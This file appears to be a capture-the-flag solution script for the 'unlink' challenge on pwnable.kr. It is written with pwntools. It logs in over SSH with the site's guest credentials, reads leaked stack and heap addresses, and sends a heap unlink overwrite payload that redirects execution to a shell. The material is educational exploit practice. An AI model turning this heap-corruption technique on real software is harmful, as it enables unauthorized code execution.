#!/usr/bin/python2

from pwn import *

context(arch='i386', os='linux')

s = ssh(host='pwnable.kr',port=2222,user='unlink',password='guest')
p = s.process('./unlink')

shell_addr = p32(0x080484eb)

p.recvuntil("here is stack address leak: ")
stack = int(p.recv(10),16)
log.info("got stack addr")
p.recvuntil("here is heap address leak: ")
heap = int(p.recv(10),16)
log.info("got heap addr")
p.recvuntil("now that you have leaks, get shell!")

offset = 16

payload = shell_addr
payload += cyclic(offset-len(shell_addr))

payload += p32(heap+8+4)
payload += p32(stack+16)

log.info("sending payload")
p.sendline(payload)
p.interactive()

p.close()
s.close()
